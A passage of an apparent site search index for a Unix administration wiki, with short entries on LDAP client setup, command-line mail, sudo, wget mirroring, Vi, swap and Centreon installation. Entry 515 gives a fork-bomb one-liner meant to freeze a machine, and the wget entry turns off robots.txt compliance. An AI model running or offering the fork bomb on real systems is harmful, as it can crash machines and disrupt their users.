shadow:dc=openldap,dc=mycompany,dc=com?sub NS_LDAP_SERVICE_SEARCH_DESC= group:dc=openldap,dc=mycompany,dc=com?sub NS_LDAP_SERVICE_AUTH_METHOD= pam_ldap:simple And the file containing the credentials:\n# # Do not edit this file manually; your changes will be lost.Please use ldapclient (1M) instead. # NS_LDAP_BINDDN= cn=admin,dc=openldap,dc=mycompany,dc=lan NS_LDAP_BINDPASSWD= {NS1}4a3788e8c053424f To generate a password, use the ldap_gen_profil command:\nldap_gen_profile -P profile -b dc=mycompany,dc=local -w test 127.0.0.1 | grep SolarisBindPassword Resources linkhttp://docs.sun.com/app/docs/doc/806-4077/6jd6blbev?a=view#ldapsecure-74 http://www.ypass.net/solaris/openldap/ldapcachemgr.php\n"
            }
        );
    index.add(
            {
                id:  511 ,
                href: "\/Envoie_de_mails_en_lignes_de_commandes\/",
                title: "Sending Emails from Command Line",
                description: "Guide to sending emails via command line using mail and mutt on Unix/Linux systems, with examples of attaching files and multiple recipients.",
                content: "Introduction linkThere can be great utility in sending emails from the command line. Everyone has their own use case, and I’ll explain how it works.\nMail linkMail is one of the most commonly used commands for sending emails:\necho \"My text body\" | mail -s \"My Subject\" \"xxx@mycompany.com\" \"mail@mail2.com\" \"mail@mail3.com\" I think this is clear enough. You can do whatever you want before the “pipe” and then send everything.\nIf you want to send an attachment, do this:\necho \"see attached file\" | mail -a filename -s \"subject\" email@address or\ncat filename | uuencode filename | mail -s \"Email subject\" user@example.com Mutt linkMutt is not specifically dedicated to sending emails, but the advantage is being able to attach files. Here’s another small example:\necho \"My text body\" | mutt -x -a my_attachment -s \"My Subject\" \"xxx@mycompany.com\" \"mail@mail2.com\" \"mail@mail3.com\" "
            }
        );
    index.add(
            {
                id:  512 ,
                href: "\/Sudo_:_Ex%C3%A9cuter_des_commandes_en_root_sans_l%27%C3%AAtre\/",
                title: "Sudo: Running commands as root without being root",
                description: "Learn how to use sudo to execute commands with root privileges without logging in as root, including installation, configuration and usage examples.",
                content: "Introduction linkSudo is frequently used and very practical because it allows occasional execution of commands as root without being logged in as root. It has several security options for usage.\nInstallation linkIt’s super simple as usual:\napt-get install sudo Configuration linkEdit the /etc/sudoers file and adapt according to your needs…\nGive all rights to a person linkWarning: this operation is equivalent to giving all root rights to a person. They will be able to change the root password, see everything, delete everything. If you wish to apply this type of rights, add this:\nusername ALL=(ALL) ALL Replace username with the name of the user in question.\nAllow only one application to be run as root linkIf, for example, a user needs to be root to perform a recurring task, which is (most of the time) a script that will run in the background, there should not be a password request, otherwise it cannot execute. This is why you should do it like this:\nusername ALL=NOPASSWD: /my/script.sh Put the username at the beginning, then the script or command that this user will have the right to run. You can even put arguments to force the user to use this command only with certain arguments.\nMultiple authorizations linkTo combine authorizations, simply put a comma:\nusername ALL=(ALL) ALL, NOPASSWD: /my/script.sh Usage linkOnce a person has the rights, just use sudo, followed by the command:\nusername@machine $ sudo /my/script.sh Get the list of available commands linkHere I’m checking the properties for user pmavro:\n$ sudo -l [sudo] password for pmavro: User pmavro may run the following commands on this host: (ALL) ALL "
            }
        );
    index.add(
            {
                id:  513 ,
                href: "\/Trouver_des_liens_symboliques_cass%C3%A9s\/",
                title: "Finding Broken Symbolic Links",
                description: "How to find and clean up broken symbolic links on Unix systems",
                content: "Introduction linkAfter a few years on heavily used servers, especially those with many users, you may end up with broken symbolic links. Here’s a solution to find them all at once.\nUsage linkTo search for all broken links:\nfind . -type l ! -exec test -e {} \\; -print And to delete them in the same operation:\nfind . -type l ! -exec test -e {} \\; -print0 | xargs -0 rm "
            }
        );
    index.add(
            {
                id:  514 ,
                href: "\/aspirer-un-site-web\/",
                title: "Mirroring a Website",
                description: "How to mirror an entire website locally using wget command line utility",
                content: "Introduction linkThere are software applications that allow you to mirror websites, but why use them when a simple command can do the same thing?\nUsage linkTo mirror mozilla.org for example, use this command:\nwget --random-wait -r -p -e robots=off -U mozilla http://www.mozilla.org -p: Include all files, images, etc. -e robots=off: Bypass the robot.txt file -U: Specify mozilla as the browser that will do the mirroring –random-wait: Allows wget to randomize download times in seconds to avoid blacklists Other useful parameters:\n–limit-rate=20k: Limits download speed to 20k -b: wget continues to run even if you log out (like nohup) -o: $HOME/wget_log.txt log file "
            }
        );
    index.add(
            {
                id:  515 ,
                href: "\/Faire_freezer_une_machine_par_overload_CPU\/",
                title: "Freeze a Machine by CPU Overload",
                description: "How to freeze a machine by causing CPU overload, useful for testing system stability and resource limits.",
                content: "Introduction linkHere is a solution to max out your CPU so much that your machine will freeze.\nUsage linkSimply run this in a terminal:\n:(){ :|:\u0026 };: "
            }
        );
    index.add(
            {
                id:  516 ,
                href: "\/Suppression_des_%C3%A9l%C3%A9ments_superflus_dans_un_fichier_texte\/",
                title: "Removing Superfluous Elements in Text Files",
                description: "How to clean text files by removing unwanted characters like ^M line endings and empty lines using various command-line tools.",
                content: "Introduction linkThe title of this documentation is admittedly ambiguous, but it’s difficult to be more specific. When you’re developing or writing text, unwanted characters may appear in your files, such as tabulations on empty lines, “^M” characters at the end of each line, or similar artifacts depending on the editor you’ve chosen.\nHere’s how to save precious bytes :-p and most importantly, make your documents “clean”.\nRemoving ^M Characters at the End of Lines linkHave you used Windows Wordpad? Too bad, why not use a real OS? :-p Use this command on your file to clean it:\nperl -pi -e 's:^V^M::g' my_dirty_file \u003e my_clean_file Removing Empty Lines link sed '/./,$!d' my_dirty_file \u003e my_clean_file or\ntr -d \"\\n\" \u003c file1 \u003e file2 "
            }
        );
    index.add(
            {
                id:  517 ,
                href: "\/Renommer_en_masse_des_%C3%A9l%C3%A9ments\/",
                title: "Batch Renaming Elements",
                description: "Tips and techniques for batch renaming files and elements in a system",
                content: "Introduction linkHere are some quick tips (albeit a bit crude) to make bulk modifications to elements.\nRename All Uppercase Elements to Lowercase link find . -type f Make Elements Sequential link for i in `seq -f %03g 5 50 111`; do echo $i ; done The seq command will give:\nfoo01 foo04 foo07 foo10 "
            }
        );
    index.add(
            {
                id:  518 ,
                href: "\/Initiation_%C3%A0_Vi\/",
                title: "Introduction to Vi",
                description: "A comprehensive guide to learning and using the Vi text editor on Linux systems, from basic commands to advanced features.",
                content: "Introduction linkAll Linux users have Vi by default on their system, but few know how to use it. Let’s discover this very useful editor.\nWhy would I use Vi? linkIf you’ve ever seen someone learning to use Vi, you’ve probably noticed that it often involves numerous expletives and a lot of frustration… And yet, a few moments of keyboard struggle can be very beneficial in the long run.\nWhat is this complicated tool? linkVi, which you would pronounce [vi:aj] if you want to be trendy, is the basic editor for all Unix systems. It works in console mode, on all types of terminals, and allows you to read, write, and edit files. Vi is based on the rudimentary Ex, a line-by-line editor: it’s actually the result of Ex’s “visual” command, which changes the edited file from line-by-line mode to full-screen mode. In simple terms, this allows you to see the content of the file you want to work with.\nIt is much more powerful than other graphical or semi-graphical editors, such as Gedit or Xedit, because it has many features that don’t exist elsewhere. The disadvantage is that to master the tools Vi offers, you need to learn a particular syntax, as Vi works by typing specific commands for the program. Plus, there are many of them, and they often don’t resemble anything you’ve seen before.\nUsing Vi therefore requires tedious learning. Here we propose to give you some keys to get started, and to show you how practical this lightweight little editor is.\nHow does it work? linkTo complicate matters a bit, Vi is a modal editor, meaning that the keys you press will not have the same effect depending on which mode you are in. There are three modes:\ninsert mode: this mode allows you to insert text into your file; command mode: in command mode, you can move the cursor through the text and type a large number of commands that will allow multiple operations, such as searching for strings, moving them, replacing them… Ex or command line mode: these are the commands of the Ex editor, which don’t work quite like those of Vi. When Vi starts up, you’re in command mode. You enter insert mode by typing one of the insertion commands, which we’ll see below (i I a A o O). To exit, press [Esc], which brings you back to command mode. To enter Ex mode, type : or /, and commands are only executed when you press [Enter].\nThe key is not to confuse modes! If you’re in text mode and think you’re in command mode, any command you try to launch will add text; vice versa, when you think you’re in text mode, some characters you think you’re inserting may have unfortunate consequences if they turn out to launch deletion commands, for example! And it is true that this happens often at the beginning…\nWhat will it be useful for? linkSo why would we bother with this complicated editor? Well, simply because one day or another you’ll definitely need it, and it’s better to be prepared for that eventuality! Have you ever been unable to start X and had to tinker with its configuration files? Have you ever had to remotely access a computer and modify its system operation options? And without looking for complicated situations, Vi is also very practical for programming, whether for a simple shell script or for using complex languages.\nFirst steps with Vi linkTo use Vi, it’s necessary to proceed step by step, otherwise you’ll quickly be overwhelmed by the number of commands to memorize. Here we’ll first see some basic approaches, which are sufficient for regular use of Vi, but which don’t allow you to discover all its effectiveness.\nEditing, saving a file and quitting Vi linkTo start Vi, just type its name in a console. Opening a file is not much more complicated:\nvi my_file.txt Your file opens and fills almost the entire terminal, except for the last line which displays some information about it: it is on this last line that you will type your commands, and where error messages will appear.\nTo quit Vi, you’ll need to type the command :q.\nIf my_file.txt didn’t exist yet, it will be created when you launch the command $ vi my_file.txt. But be careful, you’ll need to save it for it to be saved. For that, use the command :w.\nSo get into the habit before quitting Vi of launching a little :wq. If you’ve modified your file but don’t save it when quitting, Vi will tell you with an error message:\nFile modified since last complete write; write or use ! to override. To force quit without saving changes, use :q!.\nMoving around in a file linkExplaining how to move around in a file may seem quite stupid… But keep in mind that Vi was built when keyboard navigation keys didn’t exist! While you can use them, it’s good to know the commands to use, just in case:\nh moves the cursor one character to the left; l moves the cursor one character to the right; j moves the cursor one line down; k moves the cursor one line up; $ moves the cursor to the last character of the line; 0 (zero) moves the cursor to the first character of the line. In addition to these basic movement commands, there are others that are much more powerful. We’ll only mention a few here:\n[Ctrl] + [F] allows you to move the cursor forward one screen; [Ctrl] + [B] allows you to move the cursor back one screen; G will bring your cursor to the last line of the file; 3G will bring the cursor to the third line of the file; 3w or 3b will move the cursor three words to the right or to the left; 3| will bring the cursor to the third column of the file. Writing and correcting linkNow let’s get to serious business and insert text into our file. Vi has a whole series of commands that allow you to switch from command mode to insert mode in different ways:\nafter typing a, you will insert your character after the cursor; i inserts the character before the cursor; A inserts the text after the last character of the current line; I inserts the text at the beginning of the current line; o inserts the text in a new line below the current line; O inserts the text in a new line above the current line. Correcting your text with Vi also presents many possibilities (remember to exit insert mode by pressing [Esc] to make corrections):\nx deletes the character under the cursor; combined with a repetition factor, the same command will delete the specified number of characters from the cursor (example: 4x); dw deletes the characters from the one under the cursor to the beginning of the next word, space included; 5dw will delete the five words following the character under the cursor; D deletes the entire line from the character under the cursor; dd deletes the current line; 4dd will delete four lines from the current line; rt will replace the character under the cursor with the character t; rb will replace it with b, etc.; C replaces the entire line from the character under the cursor with what you will type next, the insertion ending with [Esc]; ~ will change the case of the character under the cursor: a lowercase will become an uppercase, and vice versa. In case of an error, you also have the possibility to use the u command, which cancels the last modification made to the text.\nConfiguring Vi linkAt this stage, and to avoid quite a few disappointments, we’ll give you a trick… It is possible to know at any time which operating mode of Vi you are in… For this, switch to command mode, or check that you are there by pressing [Esc], and type the command:\n:set showmode Then, launch the command with [Enter]. From that moment, and for the entire current session, you will see the mode you are in on the right side of the command line: Insert or Command. Practical, isn’t it? You’ve just modified the default configuration of Vi. And there are many other configuration options.\nVi configuration options linkThe command :set all will give you an overview of all Vi configuration options. With the command :set, you will only see the default options that you have modified. Most Vi options work like switches. To activate an option, type :set Option_name and to deactivate it :set noOption_name. Here’s an overview of useful options to start with:\nshowmode / noshowmode: to activate or deactivate the display of the mode you are in; verbose / noverbose: by default, when Vi cannot do what you ask, the program warns you with an audible beep; the verbose option transforms this beep into a written message, very useful for beginners; number / nonumber: this option allows you to number the lines of the file; wrapscan / nowrapscan: when you are searching your file, activating this option will allow you to continue the search at the beginning of the text; otherwise the search is stopped at the end of the text; showmatch / noshowmatch: this option is very useful for programming: it allows, every time you close a brace or parenthesis, to highlight the corresponding opening brace or parenthesis for a few seconds. Making configuration changes permanent linkThe option modifications you make during a Vi session are not saved. When you exit the program, they are canceled, and the default configuration is reset at the next launch.\nTo make these modifications permanent, you need to create a .exrc file in your home directory:\ncd vi .exrc Then indicate in the created file the options you want to start Vi with by writing their name preceded by set (without the :):\nset verbose set showmode set number Then save and quit with :wq.\nAdvanced Features linkNow, you already know enough to use Vi in a very profitable way. However, here’s a small overview of some advanced functions to show you that Vi has nothing to envy from a graphical editor.\nCopy - paste linkVi has a buffer memory whose content can then be copied to where you want in the text.\nThe command yy or Y copies the current line into the buffer memory, and 8yy copies eight lines from that same line. The P command inserts the buffer content before the current line, and p inserts it after.\nYou can also copy a series of characters…\ny$ to copy to the end of the line; y8w to copy eight words from the current word; … and then paste it where you want with p and P. Note also that everything that is deleted is also kept in buffer memory. So you can easily cut and paste. For example, ddp will delete the current line and copy it below the next line.\nSearch - replace linkTwo commands allow you to search for a string of characters in a file:\n/string lets you search for occurrences of string forward from the cursor position; ?string lets you search for occurrences of string backward. These two commands are activated by pressing [Enter]. The cursor then comes to rest on the first character of the found string.\nTo continue the search in the same direction, use the n command; to continue it in the opposite direction, use N.\nIf Vi doesn’t find the occurrence, the message “Pattern not found” appears. When a search has been successful, the end of the search is indicated by the message “Reached end-of-file without finding the pattern” or “Reached top-fo-file without finding the pattern”.\nIf you had previously activated the wrapscan option, the search will be carried out throughout the document, and the message announcing the end of the search becomes “Search wrapped”.\nVi also allows you to replace searched strings with others. This time it’s the s command that will be used. It is activated on the command line, so you introduce it with :, and launch it with [Enter]. Its operation assumes several options. The basic syntax is as follows:\n:s/string_to_replace/replacement_string/ This command replaces the first occurrence of the specified characters in the current line. It is possible to specify the line or series of lines where you want to perform the replacement:\n:1,3s/string_to_replace/replacement_string/ replaces the first occurrence of each line from line 1 to line 3. Note that . will designate the active line, and $ the last line of the file.\nIt is also possible to specify that all occurrences on the same line should be replaced by adding the g option:\n:s/string_to_replace/replacement_string/g For a confirmation to be requested before each replacement, add the c option:\n:s/string_to_replace/replacement_string/c You will then respond to the “Confirm change?” message with y (yes) or n (no).\nAnd there you go! You can now use Vi in a quite effective way!! Practice, and you can then discover its expert features!\nResources linkhttp://www.unixgarden.com/index.php/comprendre/initiation-a-vi\n"
            }
        );
    index.add(
            {
                id:  519 ,
                href: "\/Liste_des_commandes_les_plus_utilis%C3%A9es\/",
                title: "Most Used Commands List",
                description: "A comprehensive list of the most commonly used Linux commands and useful command-line tips.",
                content: "Introduction linkWhile GUIs are nice on Linux systems, they are completely unnecessary on servers and only waste resources. This is why I’m providing a list of the most used commands as well as some practical usage tips.\nUsage linkRecalling the Last Argument from the Previous Command linkHere’s a useful tip that lets you recall the last argument from the previously executed command. For example:\n$ cd /root $ ls !$ test1 test2 Most Used Commands linkLinux commands line documentation\n"
            }
        );
    index.add(
            {
                id:  520 ,
                href: "\/SWAP_:_Cr%C3%A9ation_de_swap_dynamique\/",
                title: "SWAP: Creating Dynamic Swap",
                description: "Guide on how to create and manage dynamic swap space in Linux through partition-based and image-based methods.",
                content: "Introduction linkCreating a swap partition is quite straightforward but extremely useful when you’re running out of RAM.\nCreating Swap linkOn a Partition linkUse fdisk on the target partition:\nfdisk /dev/hdc1 Then create a primary partition with the key combination “n p 1”. Next, change the ID to indicate it’s a swap partition with “t 82”.\nSave everything with the “w” key. To finish setting up our partition, we need to initialize it:\nmkswap /dev/hdc1 Now let’s use it:\nswapon /dev/hdc1 I recommend modifying your /etc/fstab file so that the swap is used on the next boot:\n... /dev/hdc1 swap swap defaults 0 0 ... On a Disk Image linkIf you can’t create a swap partition, you have the option to create a disk image and assign it as additional swap:\ndd if=/dev/zero of=/swapfile bs=1M count=64 chmod 600 /swapfile mkswap /swapfile swapon /swapfile Obviously, this size is small and serves as an example. You should adjust the dd command according to the available space on one of your partitions and adapt it to your swap needs.\nResources linkDocumentation on Creating dynamic swap space\n"
            }
        );
    index.add(
            {
                id:  521 ,
                href: "\/Manipuler_des_images_en_ligne_de_commande\/",
                title: "Manipulating Images via Command Line",
                description: "How to manipulate images using command line tools with ImageMagick",
                content: "Introduction linkIt can be very useful to manipulate images through the command line. For example, to automate tasks.\nInstallation linkFor the following manipulations, we’ll need ImageMagick:\napt-get install imagemagick Usage linkGetting Information About an Image link identify -format \"%wx%h\" /path/to/image.jpg "
            }
        );
    index.add(
            {
                id:  522 ,
                href: "\/preventing_indexed_website\/",
                title: "Preventing your website from being indexed (disabling robot scans)",
                description: "How to prevent search engines from crawling and indexing your website using robots.txt file and meta tags",
                content: "Introduction link“Robots.txt” is a regular text file that through its name, has special meaning to the majority of “honorable” robots on the web. By defining a few rules in this text file, you can instruct robots to not crawl and index certain files, directories within your site, or at all. For example, you may not want Google to crawl the /images directory of your site, as it’s both meaningless to you and a waste of your site’s bandwidth. “Robots.txt” lets you tell Google just that.\nIndex linkAnother solution to robot.txt consists in editing your index (index.html/index.php…) of your website and entering this content:\nor robots.txt linkDeny All linkHere’s a basic “robots.txt”:\nUser-agent: * Disallow: / With the above declared, all robots (indicated by “*”) are instructed to not index any of your pages (indicated by “/”). Most likely not what you want, but you get the idea.\nDeny Google Image Bot linkYou may not want Google’s Image bot crawling your site’s images and making them searchable online, if just to save bandwidth. The below declaration will do the trick:\nUser-agent: Googlebot-Image Disallow: / Disable all search engine linkThe following disallows all search engines and robots from crawling select directories and pages:\nUser-agent: * Disallow: /cgi-bin/ Disallow: /privatedir/ Disallow: /tutorials/blank.htm Multiple robots restrictions linkYou can conditionally target multiple robots in “robots.txt.” Take a look at the below:\nUser-agent: * Disallow: / User-agent: Googlebot Disallow: /cgi-bin/ Disallow: /privatedir/ This is interesting - here we declare that crawlers in general should not crawl any parts of our site, EXCEPT for Google, which is allowed to crawl the entire site apart from /cgi-bin/ and /privatedir/. So the rules of specificity apply, not inheritance.\nAllow and Disallow restrictions - Method 1 linkThere is a way to use Disallow: to essentially turn it into “Allow all”, and that is by not entering a value after the semicolon(:):\nUser-agent: * Disallow: / User-agent: ia_archiver Disallow: Here all crawlers should be prohibited from crawling our site, except for Alexa, which is allowed.\nAllow and Disallow restrictions - Method 2 linkFinally, some crawlers now support an additional field called “Allow:”, most notably, Google. As its name implies, “Allow:” lets you explicitly dictate what files/folders can be crawled. However, this field is currently not part of the “robots.txt” protocol, so use it only if absolutely needed, as it might confuse some less intelligent crawlers.\nPer Google’s FAQs for webmasters, the below is the preferred way to disallow all crawlers from your site EXCEPT Google:\nUser-agent: * Disallow: / User-agent: Googlebot Allow: / Finally this file (robot.txt) must be uploaded to the root accessible directory of your site, not a subdirectory (eg. www.mysite.com/robot.txt) it is only by following the above rules will search engines interpret the instructions contained in the file.\nResources linkhttp://linuxpoison.blogspot.com/2009/02/how-to-create-and-configure-robottxt.html\n"
            }
        );
    index.add(
            {
                id:  523 ,
                href: "\/Mise_en_place_de_Memcached_sur_Wordpress\/",
                title: "Setting up Memcached on WordPress",
                description: "How to set up Memcached on WordPress to improve website performance",
                content: "Introduction linkMemcached is a cache server that, unlike some PHP accelerators, does not consume additional CPU. It’s therefore an ideal compromise. For WordPress, there is currently no simple solution to quickly set up this solution (although it’s not very time-consuming anyway).\nInstallation linkOn Debian, it’s easy:\napt-get install memcached Your memcached server is now running on port 11211.\nConfiguration linkServer linkNothing special needs to be done, the basic configuration is sufficient.\nWordPress linkGo to the wp-content folder of your WordPress, then download these files and set the proper permissions:\ncd ./wp-content wget http://svn.wp-plugins.org/memcached/branches/1.0/memcached-client.php wget http://svn.wp-plugins.org/memcached/branches/1.0/object-cache.php chown www-data. memcached-client.php object-cache.php cd .. Then modify the WordPress configuration file wp-config.php and add this line (wp-config.php):\n$memcached_servers = array('127.0.0.1:11211'); If you have multiple memcached servers, here’s the syntax to use (wp-config.php):\n$memcached_servers = array('192.168.1.1:11211', '192.168.1.2:11211'); Resources linkhttp://ryan.wordpress.com/2005/12/23/memcached-backend/\n"
            }
        );
    index.add(
            {
                id:  524 ,
                href: "\/Obtenir_les_informations_hardware_d\u0027une_machine\/",
                title: "Getting Hardware Information from a Machine",
                description: "A guide on how to obtain hardware information from different operating systems including Linux, BSD, and Solaris.",
                content: "Introduction linkOn machines (especially remote ones), it’s often useful to obtain information such as available RAM, etc.\nIn short, we might need other information, and I’m not sure where to put all of this data.\nLinux linkdmesg linkThis command shows what is written during kernel boot and all kernel calls (module loading, etc.). On some distributions, it’s even written in the logs in /var/log/*. Here’s an example output:\ndmesg [ 0.000000] Linux version 2.6.22-14-generic (buildd@king) (gcc version 4.1.3 20070929 (prerelease) (Ubuntu 4.1.2-16ubuntu2)) #1 SMP Tue Feb 12 02:46:46 UTC 2008 (Ubuntu 2.6.22-14.52-generic) [ 0.000000] Command line: root=/dev/mapper/lvm-racine ro quiet splash [ 0.000000] BIOS-provided physical RAM map: [ 0.000000] BIOS-e820: 0000000000000000 - 000000000009fc00 (usable) [ 0.000000] BIOS-e820: 00000000000f0000 - 0000000000100000 (reserved) [ 0.000000] BIOS-e820: 0000000000100000 - 000000007fe0ac00 (usable) ... dmidecode linkThis command allows you to view RAM usage, free space, and other useful information:\n# dmidecode 2.9 SMBIOS 2.3 present. 75 structures occupying 2618 bytes. Table at 0x000F0450. Handle 0xDA00, DMI type 218, 65 bytes OEM-specific Type Header and Data: DA 41 00 DA B2 00 17 0B 0E 38 00 00 80 00 80 01 00 02 80 02 80 01 00 00 A0 00 A0 01 00 58 00 58 00 01 00 59 00 59 00 01 00 75 01 75 01 01 00 76 01 76 01 01 00 05 80 05 80 01 00 FF FF 00 00 00 00 Handle 0xDA01, DMI type 218, 35 bytes OEM-specific Type Header and Data: DA 23 01 DA B2 00 17 0B 0E 38 00 10 F5 10 F5 00 00 11 F5 11 F5 00 00 12 F5 12 F5 00 00 FF FF 00 ... Hard Disks linkFor hard disk information, use the hdparm command to get all the details:\n$ hdparm -i /dev/sda /dev/sda: Model=ST3500320AS , FwRev=SD15 , SerialNo= 9QM89WJF Config={ HardSect NotMFM HdSw\u003e15uSec Fixed DTR\u003e10Mbs RotSpdTol\u003e.5% } RawCHS=16383/16/63, TrkSize=0, SectSize=0, ECCbytes=4 BuffType=unknown, BuffSize=0kB, MaxMultSect=16, MultSect=?8? CurCHS=16383/16/63, CurSects=16514064, LBA=yes, LBAsects=976773168 IORDY=on/off, tPIO={min:120,w/IORDY:120}, tDMA={min:120,rec:120} PIO modes: pio0 pio1 pio2 pio3 pio4 DMA modes: mdma0 mdma1 mdma2 UDMA modes: udma0 udma1 udma2 udma3 udma4 udma5 *udma6 AdvancedPM=no WriteCache=enabled Drive conforms to: unknown: ATA/ATAPI-4,5,6,7 * signifies the current active mode BSD linkdmesg linkJust like in Linux, the dmesg command exists, but the logs are not in the same place. You need to look in the /var/run/dmesg.boot file:\n$ cat /var/run/dmesg.boot OpenBSD 4.2 (GENERIC.MP) #1378: Tue Aug 28 10:48:58 MDT 2007 deraadt@amd64.openbsd.org:/usr/src/sys/arch/amd64/compile/GENERIC.MP real mem = 2146729984 (2047MB) avail mem = 2073427968 (1977MB) mainbus0 at root bios0 at mainbus0: SMBIOS rev. 2.4 @ 0x7ffbc000 (62 entries) bios0: vendor Dell Inc. version \"1.5.1\" date 08/10/2007 bios0: Dell Inc. PowerEdge 1950 acpi at mainbus0 not configured ipmi0 at mainbus0: version 2.0 interface KCS iobase 0xca8/8 spacing 4 mainbus0: Intel MP Specification (Version 1.4) cpu0 at mainbus0: apid 0 (boot processor) cpu0: Intel(R) Xeon(R) CPU 5130 @ 2.00GHz, 1995.33 MHz cpu0: FPU,VME,DE,PSE,TSC,MSR,PAE,MCE,CX8,APIC,SEP,MTRR,PGE,MCA,CMOV,PAT,PSE36,CFLUSH,DS,ACPI,MMX,FXSR,SSE,SSE2,SS,HTT,TM,SBF,SSE3,MWAIT,DS-CPL,VMX,TM2,CX16,xTPR,NXE,LONG cpu0: 4MB 64b/line 16-way L2 cache cpu0: apic clock running at 332MHz cpu1 at mainbus0: apid 1 (application processor) cpu1: Intel(R) Xeon(R) CPU 5130 @ 2.00GHz, 1995.02 MHz cpu1: FPU,VME,DE,PSE,TSC,MSR,PAE,MCE,CX8,APIC,SEP,MTRR,PGE,MCA,CMOV,PAT,PSE36,CFLUSH,DS,ACPI,MMX,FXSR,SSE,SSE2,SS,HTT,TM,SBF,SSE3,MWAIT,DS-CPL,VMX,TM2,CX16,xTPR,NXE,LONG cpu1: 4MB 64b/line 16-way L2 cache mpbios: bus 0 is type PCI mpbios: bus 1 is type PCI ... Solaris linkprtdiag linkHere’s how to obtain hardware information on Solaris:\nSystem Configuration: Sun Microsystems Sun Fire X4140 BIOS Configuration: American Megatrends Inc. 080014 10/15/2008 BMC Configuration: IPMI 2.0 (KCS: Keyboard Controller Style) ==== Processor Sockets ==================================== Version Location Tag -------------------------------- -------------------------- Quad-Core AMD Opteron(tm) Processor 2384 CPU 1 Quad-Core AMD Opteron(tm) Processor 2384 CPU 2 ==== Memory Device Sockets ================================ Type Status Set Device Locator Bank Locator ------- ------ --- ------------------- -------------------- unknown empty 0 DIMM0 BANK0 unknown empty 0 DIMM1 BANK1 DDR2 in use 0 DIMM2 BANK2 DDR2 in use 0 DIMM3 BANK3 DDR2 in use 0 DIMM4 BANK4 DDR2 in use 0 DIMM5 BANK5 DDR2 in use 0 DIMM6 BANK6 DDR2 in use 0 DIMM7 BANK7 unknown empty 0 DIMM8 BANK8 unknown empty 0 DIMM9 BANK9 DDR2 in use 0 DIMM10 BANK10 DDR2 in use 0 DIMM11 BANK11 DDR2 in use 0 DIMM12 BANK12 DDR2 in use 0 DIMM13 BANK13 DDR2 in use 0 DIMM14 BANK14 DDR2 in use 0 DIMM15 BANK15 ==== On-Board Devices ===================================== Gigabit Ethernet #1 Gigabit Ethernet #2 Gigabit Ethernet #3 Gigabit Ethernet #4 AST2000 VGA ==== Upgradeable Slots ==================================== ID Status Type Description --- --------- ---------------- ---------------------------- 0 in use PCI Express PCIExp SLOT0 1 available PCI Express PCIExp SLOT1 2 in use PCI Express PCIExp SLOT2 3 available PCI Express PCIExp SLOT3 4 available PCI Express PCIExp SLOT4 5 available PCI Express PCIExp SLOT5 prtconf link System Configuration: Sun Microsystems i86pc Memory size: 73728 Megabytes System Peripherals (Software Nodes): i86pc scsi_vhci, instance #0 disk, instance #5 disk, instance #6 disk, instance #7 disk, instance #8 isa, instance #0 asy, instance #0 motherboard (driver not attached) pci, instance #0 pci10de,cb84 (driver not attached) pci10de,cb84 (driver not attached) pci10de,cb84 (driver not attached) pci10de,cb84, instance #0 device, instance #0 keyboard, instance #0 mouse, instance #1 pci10de,cb84, instance #0 storage, instance #0 disk, instance #2 hub, instance #0 pci10de,cb84, instance #0 pci10de,cb84, instance #1 pci10de,cb84, instance #2 pci10de,370, instance #0 display, instance #0 pci10de,cb84, instance #0 pci10de,cb84, instance #1 pci10de,377 (driver not attached) pci10de,376 (driver not attached) pci10de,375, instance #2 pci108e,286, instance #0 disk, instance #3 pci1022,1200 (driver not attached) pci1022,1201 (driver not attached) pci1022,1202 (driver not attached) pci1022,1203 (driver not attached) pci1022,1204 (driver not attached) pci1022,1200 (driver not attached) pci1022,1201 (driver not attached) pci1022,1202 (driver not attached) pci1022,1203 (driver not attached) pci1022,1204 (driver not attached) pci, instance #1 pci10de,cb84 (driver not attached) pci10de,cb84 (driver not attached) pci10de,368 (driver not attached) pci10de,cb84, instance #3 pci10de,cb84, instance #4 pci10de,cb84, instance #5 pci10de,cb84, instance #2 pci10de,cb84, instance #3 pci10de,378 (driver not attached) pci10de,376 (driver not attached) pci10de,377, instance #5 pci1077,143, instance #0 fp, instance #0 disk, instance #9 disk, instance #10 pci1077,143, instance #1 fp, instance #1 disk, instance #4 iscsi, instance #0 pseudo, instance #0 options, instance #0 agpgart, instance #0 xsvc, instance #0 objmgr, instance #0 used-resources (driver not attached) cpus, instance #0 cpu, instance #0 cpu, instance #1 cpu, instance #2 cpu, instance #3 cpu, instance #4 cpu, instance #5 cpu, instance #6 cpu, instance #7 Resources linkHardware Configuration Mastery\nDmidecode - Finding Out Hardware Details Without Opening The Computer Case\n"
            }
        );
    index.add(
            {
                id:  525 ,
                href: "\/Installation_et_configuration_d\u0027un_serveur_Centreon\/",
                title: "Installation and Configuration of a Centreon Server",
                description: "Learn how to install and configure a Centreon server on Debian Linux with step-by-step instructions including LAMP, Nagios, NDOutils setup and troubleshooting.",
                content: "Introduction linkCentreon is one of the most flexible and powerful GPL-licensed monitoring software solutions. It’s built on top of the OpenSource Nagios technology.\nDesigned for a wide range of users, it’s perfectly suited for measuring system, network, and application indicators. Centreon brings together essential functions for managing monitoring of critical infrastructures. Being modular, it adapts to your needs and allows you to extend its functionality further.\nFor my part, I chose to move from Nagios 3 to Centreon to get graphics and reporting capabilities.\nThe installation below is performed on Debian Lenny 64 bits.\nInstallation linkLAMP linkFor the installation, we’ll first install the prerequisites, namely a web server, mail server, and SQL (Apache2+PHP, postfix, mysql) as well as the necessary libraries to create graphs (rrdtool):\naptitude install sudo sysutils mailx lsb-release postfix build-essential apache2 apache2-mpm-prefork php5 php5-mysql php-pear php5-ldap php5-snmp php5-gd mysql-server-5.0 libmysqlclient15-dev rrdtool \\ librrds-perl libconfig-inifiles-perl libcrypt-des-perl libdigest-hmac-perl libdigest-sha1-perl libgd-gd2-perl snmp snmpd libnet-snmp-perl libsnmp-perl libgd2-xpm libgd2-xpm-dev libpng12-dev Nagios 3 linkNext, we’ll install nagios3 and the plugins:\naptitude install nagios3 nagios3-common nagios3-doc nagios-plugins nagios-plugins-basic nagios-plugins-standard nagios-images dnsutils fping Let’s create the nagcmd group, then add nagios and nagcmd to www-data (apache2):\ngroupadd nagcmd usermod -G nagios,nagcmd nagios usermod -G nagios,nagcmd www-data NDOutils linkLet’s install NDOutils:\naptitude install ndoutils-nagios3-mysql ndoutils-common dbconfig-common Let’s activate it by setting the following value to 1:\nENABLE_NDOUTILS=1 Then restart the service:\n/etc/init.d/ndoutils restart Centreon linkFinally, we arrive at Centreon! Let’s download the latest version, decompress it, then start the installation:\ncd ~ wget \"http://download.centreon.com/index.php?id=105\" tar -xzf 